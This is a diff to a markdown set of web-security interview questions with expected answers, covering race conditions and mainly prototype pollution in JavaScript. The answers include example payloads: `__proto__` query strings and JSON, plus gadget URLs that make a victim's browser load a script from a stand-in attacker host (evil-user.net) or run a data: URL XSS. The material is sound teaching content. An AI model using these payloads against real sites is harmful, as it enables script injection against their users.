@@ -6,6 +6,7 @@
 
 #### Questions
 
+**Race conditions**:
 1. What is a race condition?
 2. What is a race window?
 3. What is a limit overrun race condition?
@@ -16,6 +17,21 @@
 8. What is the Single-Packet Attack Technique (for HTTP/2)?
 9. Explain how to prevent race condition vulnerabilities. 
 10. Explain what a Time-of-Check to Time-of-Use (TOCTOU) race condition is and provide a strategy for mitigating such vulnerabilities.
+
+**Prototype Pollution**:
+1. What is prototype pollution?
+2. How do prototype pollution vulnerabilities arise? 
+3. What is the special meaning of the \_\_proto\_\_ property?
+4. Is it possible to pollute any prototype object?
+5. Exploitation of prototype pollution requires the what key components?  
+6. What are prototype pollution sources?
+7. Explain prototype pollution via the URL works?
+8. What is the role of the JSON.parse() method in the context of prototype pollution via JSON input?  
+9. How can an attacker exploit the JSON.parse() method to achieve prototype pollution?
+10. Illustrate with an example how parsing malicious JSON leads to prototype pollution.
+11. Describe prototype pollution sinks?
+12. Describe prototype pollution gadgets?
+13. Give an example of a prototype pollution gadget.
 
 ### Web Security
 
@@ -72,8 +88,8 @@ To mitigate TOCTOU vulnerabilities, one effective strategy is to perform the che
 1. How do prototype pollution vulnerabilities arise?  
 **Expected Answer**: when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties. The merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.
 
-1. What is the special meaning of the __proto__ property?  
-**Expected Answer**: Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, __proto__ is the de facto standard used by most browsers. This property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary. 
+1. What is the special meaning of the \_\_proto\_\_ property?  
+**Expected Answer**: Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, \_\_proto\_\_ is the de facto standard used by most browsers. This property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary. 
 
 1. Is it possible to pollute any prototype object?  
 **Expected Answer**: Yes, but this commonly occurs with the built-in global `Object.prototype`.
@@ -92,7 +108,31 @@ To mitigate TOCTOU vulnerabilities, one effective strategy is to perform the che
    * JSON-based input
    * Web messages
 
-1. Explain how prototype pollution via the URL works?  
-**Expected Answer**: For the url `https://vuln.com/?__proto__[evilProperty]=payload`. A URL parser may interpret __proto__ as an arbitrary string, but if `key:value` are merged into an existing object as properties. The recursive merge operation may assign the value of evilProperty using a statement equivalent to the following: `targetObject.__proto__.evilProperty = 'payload';` During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key.
+1. Explain prototype pollution via the URL works?  
+**Expected Answer**: For the url `https://vuln.com/?__proto__[evilProperty]=payload`. A URL parser may interpret `__proto__` as an arbitrary string, but if `key:value` are merged into an existing object as properties. The recursive merge operation may assign the value of evilProperty using a statement equivalent to the following: `targetObject.__proto__.evilProperty = 'payload';` During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key.
 
- 
+1. What is the role of the JSON.parse() method in the context of prototype pollution via JSON input?  
+**Expected Answer**: The JSON.parse() method is used to convert a JSON string into a JavaScript object. It treats all keys in the JSON object as arbitrary strings, including special keys like `__proto__`. This behavior can potentially lead to prototype pollution if the JSON input is not properly sanitized, especially when such input is user-controllable.
+
+1. How can an attacker exploit the JSON.parse() method to achieve prototype pollution?    
+**Expected Answer**: An attacker can exploit the JSON.parse() method by injecting malicious JSON with special keys, like \_\_proto\_\_, which are then treated as regular object properties. For example, an attacker could inject a JSON string like `{"__proto__": {"evilProperty": "payload"}}`. When this string is parsed using JSON.parse(), it creates an object with a \_\_proto\_\_ property, which is not typical behavior for standard JavaScript object literals. This can lead to unintended modifications in the prototype chain
+
+1. Illustrate with an example how parsing malicious JSON leads to prototype pollution.  
+**Expected Answer**: `const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');`
+In this case, objectFromJson will have a property \_\_proto\_\_ with the value `{evilProperty: 'payload'}`. Unlike an object literal that directly sets \_\_proto\_\_, like `const objectLiteral = {__proto__: {...}}`, where \_\_proto\_\_ is not actually a property of the object, the object created via JSON.parse() treats \_\_proto\_\_ as a regular property. If this object is later merged into another object without proper sanitization, it could modify the prototype of the latter, leading to pollution.
+
+1. Describe prototype pollution sinks?  
+**Expected Answer**: A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.
+
+1. Describe prototype pollution gadgets?  
+**Expected Answer**: A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:
+
+   * Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization
+   * Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
+
+   A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. Robust websites may also explicitly set the prototype of the object to null, which ensures that it doesn't inherit any properties at all.
+
+1. Give an example of a prototype pollution gadget.  
+**Expected Answer**: A JavaScript library uses a configuration object to set various options. It includes a line like let transport_url = config.transport_url || defaults.transport_url; to determine a URL for script loading. If transport_url isn't set by the developer, the library defaults to a predefined option.
+However, this approach can be exploited if an attacker is able to pollute the global Object.prototype with their own transport_url property. This polluted property would then be inherited by the config object, causing the library to load a script from an attacker-controlled domain.
+Manipulating the transport_url via a query parameter in the website URL. For example, by directing a victim to https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net, the attacker can make the victim's browser load a malicious script. Alternatively, an XSS payload can be embedded directly using a data: URL, like https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//, with the trailing // serving to comment out any suffixes added by the library.
